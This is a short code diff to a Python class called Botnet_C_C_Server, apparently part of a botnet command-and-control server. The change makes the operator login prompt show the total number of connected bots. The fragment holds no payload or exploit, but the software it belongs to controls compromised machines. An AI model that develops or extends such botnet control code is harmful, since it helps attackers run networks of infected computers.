@@ -89,7 +89,7 @@ class Botnet_C_C_Server:
                     pwd=pwd.strip()
                     break
             if self.login(username=user,password=pwd)==True:
-                client_socket.send(Botnet_C_C_Server.user_prompt.format(user).strip().encode())
+                client_socket.send('\r\n\r\nTotal Bots: {}\r\n\r\n{}'.format(len(self.bots_list),Botnet_C_C_Server.user_prompt.format(user).strip()).encode())
                 while True:
                     data=''
                     while True:
